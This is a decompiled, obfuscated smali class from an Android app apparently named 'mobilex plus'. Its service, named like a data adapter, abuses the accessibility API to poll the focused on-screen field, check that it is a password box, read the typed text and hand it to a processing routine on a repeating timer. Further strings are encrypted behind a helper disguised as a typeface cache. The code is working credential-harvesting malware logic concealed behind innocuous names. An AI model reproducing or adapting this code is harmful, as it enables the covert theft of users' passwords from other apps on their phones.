.class public final Lv/s/Zj7xUGIRtnJNFsajky;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

.field public final synthetic w9sT1Swbhx3hs:I


# direct methods
.method public synthetic constructor <init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V
    .locals 0

    .line 1
    iput p2, p0, Lv/s/Zj7xUGIRtnJNFsajky;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    iput-object p1, p0, Lv/s/Zj7xUGIRtnJNFsajky;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 4
    .line 5
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 6
    .line 7
    .line 8
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 5

    .line 1
    iget v0, p0, Lv/s/Zj7xUGIRtnJNFsajky;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    packed-switch v0, :pswitch_data_0

    .line 4
    .line 5
    .line 6
    iget-object v0, p0, Lv/s/Zj7xUGIRtnJNFsajky;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 7
    .line 8
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPwdPollActive$p(Lapp/mobilex/plus/services/DataQFAdapter;)Z

    .line 9
    .line 10
    .line 11
    move-result v1

    .line 12
    if-nez v1, :cond_0

    .line 13
    .line 14
    goto/16 :goto_5

    .line 15
    .line 16
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 17
    .line 18
    .line 19
    move-result-wide v1

    .line 20
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPwdPollStartTime$p(Lapp/mobilex/plus/services/DataQFAdapter;)J

    .line 21
    .line 22
    .line 23
    move-result-wide v3

    .line 24
    sub-long/2addr v1, v3

    .line 25
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPWD_POLL_TIMEOUT_MS$p(Lapp/mobilex/plus/services/DataQFAdapter;)J

    .line 26
    .line 27
    .line 28
    move-result-wide v3

    .line 29
    cmp-long v1, v1, v3

    .line 30
    .line 31
    if-lez v1, :cond_1

    nop

    nop

    .line 32
    .line 33
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$stopPwdPoll(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 34
    .line 35
    .line 36
    goto :goto_5

    nop

    .line 37
    :cond_1
    :try_start_0
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 38
    .line 39
    .line 40
    move-result-object v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    .line 41
    if-eqz v1, :cond_7

    .line 42
    .line 43
    const/16 v2, -0x56

    add-int/lit8 v2, v2, 0x57

    .line 44
    :try_start_1
    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findFocus(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 45
    .line 46
    .line 47
    move-result-object v2
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 48
    if-eqz v2, :cond_6

    .line 49
    .line 50
    :try_start_2
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    .line 51
    .line 52
    .line 53
    move-result v3

    .line 54
    if-eqz v3, :cond_5

    .line 55
    .line 56
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 57
    .line 58
    .line 59
    move-result-object v3

    .line 60
    if-eqz v3, :cond_2

    .line 61
    .line 62
    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 63
    .line 64
    .line 65
    move-result-object v3

    nop

    .line 66
    if-nez v3, :cond_3

    nop

    nop

    .line 67
    .line 68
    goto :goto_0

    .line 69
    :catchall_0
    move-exception v3

    .line 70
    goto/16 :goto_1

    .line 71
    :cond_2
    :goto_0
    const-string v3, ""

    .line 72
    .line 73
    :cond_3
    invoke-interface {v3}, Ljava/lang/CharSequence;->length()I

    .line 74
    .line 75
    .line 76
    move-result v4

    .line 77
    if-lez v4, :cond_4

    .line 78
    .line 79
    invoke-static {v0, v3, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->access$processPwdPollText(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 80
    .line 81
    .line 82
    :cond_4
    :try_start_3
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 83
    .line 84
    .line 85
    goto :goto_2

    .line 86
    :catchall_1
    move-exception v2

    .line 87
    goto :goto_3

    .line 88
    :cond_5
    :try_start_4
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$stopPwdPoll(Lapp/mobilex/plus/services/DataQFAdapter;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 89
    .line 90
    .line 91
    :try_start_5
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_1

    .line 92
    .line 93
    .line 94
    :try_start_6
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_2

    .line 95
    .line 96
    .line 97
    goto/16 :goto_5

    .line 98
    :goto_1
    :try_start_7
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 99
    .line 100
    .line 101
    throw v3
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_1

    .line 102
    :cond_6
    :goto_2
    :try_start_8
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 103
    .line 104
    .line 105
    goto/16 :goto_4

    .line 106
    :goto_3
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 107
    .line 108
    .line 109
    throw v2
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_2

    .line 110
    :catchall_2
    :cond_7
    :goto_4
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPwdPollActive$p(Lapp/mobilex/plus/services/DataQFAdapter;)Z

    .line 111
    .line 112
    .line 113
    move-result v1

    .line 114
    if-eqz v1, :cond_8

    .line 115
    .line 116
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPwdPollHandler$p(Lapp/mobilex/plus/services/DataQFAdapter;)Landroid/os/Handler;

    .line 117
    .line 118
    .line 119
    move-result-object v1

    .line 120
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPWD_POLL_INTERVAL_MS$p(Lapp/mobilex/plus/services/DataQFAdapter;)J

    .line 121
    .line 122
    .line 123
    move-result-wide v2

    .line 124
    invoke-virtual {v1, p0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 125
    .line 126
    .line 127
    :cond_8
    :goto_5
    return-void

    .line 128
    :pswitch_0
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 129
    .line 130
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 131
    .line 132
    .line 133
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 134
    .line 135
    .line 136
    move-result-object v0

    .line 137
    if-nez v0, :cond_9

    nop

    nop

    .line 138
    .line 139
    goto/16 :goto_6

    .line 140
    :cond_9
    sget-object v1, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    .line 141
    .line 142
    invoke-static {v0}, Lv/s/VpKcDcuRNaQkRJ5;->ibVTtJUNfrGYbW(Landroid/content/Context;)Z

    .line 143
    .line 144
    .line 145
    move-result v1

    .line 146
    const/16 v2, 0x0

    .line 147
    if-eqz v1, :cond_a

    .line 148
    .line 149
    sput-boolean v2, Lv/s/VpKcDcuRNaQkRJ5;->xDyLpEZyrcKVe0:Z

    nop

    nop

    .line 150
    .line 151
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 152
    .line 153
    .line 154
    const-string v0, "0013007F004B008200FC00B600DC00A2006300750053008200F300B400D700B500790036005A008B00E200BA00D300A3003A0036005F008800FE00BA009200EF003300730049009400F900AC00C600A20027003F001700C700F100AA00C600A80000007A0052008400FB00FF00FD00810005"

    .line 155
    .line 156
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 157
    .line 158
    .line 159
    goto :goto_6

    .line 160
    :cond_a
    :try_start_9
    const-string v1, "00300073004F009200E0008000C200B5002600700048"

    .line 161
    .line 162
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 163
    .line 164
    .line 165
    move-result-object v1

    .line 166
    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 167
    .line 168
    .line 169
    move-result-object v1

    .line 170
    const-string v3, "00300073004F009200E0008000D100A8002E00660057008200E400BA"

    .line 171
    .line 172
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 173
    .line 174
    .line 175
    move-result-object v3

    .line 176
    invoke-interface {v1, v3, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 177
    .line 178
    .line 179
    move-result v2

    nop
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_0

    .line 180
    :catch_0
    if-eqz v2, :cond_b

    .line 181
    .line 182
    sget-object v1, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    nop

    nop

    .line 183
    .line 184
    sget-boolean v1, Lv/s/VpKcDcuRNaQkRJ5;->JXn4Qf7zpnLjP5:Z

    nop

    .line 185
    .line 186
    if-nez v1, :cond_b

    .line 187
    .line 188
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 189
    .line 190
    .line 191
    const-string v1, "0013007F004B008200FC00B600DC00A2006300750053008200F300B400D700B5007900360048008200E400AA00C20098002000790056009700FC00BA00C600A2007E00620049009200F500F3009200B4003700770049009300F900B100D500E70033007F004B008200FC00B600DC00A20063003E0059008600F300B400C700B7006A"

    .line 192
    .line 193
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 194
    .line 195
    .line 196
    invoke-static {v0}, Lv/s/VpKcDcuRNaQkRJ5;->nQilHWaqS401ZtR(Landroid/content/Context;)V

    .line 197
    .line 198
    .line 199
    goto :goto_6

    .line 200
    :cond_b
    if-nez v2, :cond_c

    .line 201
    .line 202
    iget-object v0, p0, Lv/s/Zj7xUGIRtnJNFsajky;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 203
    .line 204
    const-wide/16 v1, 0x1388

    .line 205
    .line 206
    invoke-static {v0, p0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->access$safePostDelayed(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/Runnable;J)V

    .line 207
    .line 208
    .line 209
    :cond_c
    :goto_6
    return-void

    .line 210
    nop

    .line 211
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
    .end packed-switch
.end method
